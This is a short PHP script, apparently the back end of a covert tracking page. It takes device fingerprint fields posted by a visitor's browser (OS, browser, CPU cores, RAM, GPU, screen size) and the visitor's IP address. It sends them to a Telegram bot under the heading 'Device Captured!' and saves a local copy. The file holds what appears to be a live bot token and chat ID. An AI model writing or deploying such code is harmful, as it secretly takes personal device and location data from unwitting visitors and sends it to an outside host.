<?php
header('Content-Type: text/html');

// --- YOUR CONFIG ---
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "6862649950";

// 1. Capture Data (Matches your original file)
$ptf = $_POST['Ptf']; $brw = $_POST['Brw']; $cc = $_POST['Cc'];
$ram = $_POST['Ram']; $ven = $_POST['Ven']; $ren = $_POST['Ren'];
$ht = $_POST['Ht'];   $wd = $_POST['Wd'];   $os = $_POST['Os'];

function getUserIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
    return $_SERVER['REMOTE_ADDR'];
}
$ip = getUserIP();

// 2. Format Telegram Message
$msg = "*Device Captured!* \n\n" .
       "OS: $os\nPlatform: $ptf\nBrowser: $brw\nIP: $ip\n" .
       "Cores: $cc\nRAM: $ram\nGPU: $ven $ren\nRes: {$ht}x{$wd}";

// 3. Send to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
file_get_contents($url);

// 4. Save Locally (Backup)
$data = array('platform'=>$ptf, 'browser'=>$brw, 'cores'=>$cc, 'ram'=>$ram, 'vendor'=>$ven, 'render'=>$ren, 'ip'=>$ip, 'ht'=>$ht, 'wd'=>$wd, 'os'=>$os);
$f = fopen('../../logs/info.txt', 'w+');
fwrite($f, json_encode($data));
fclose($f);
?>
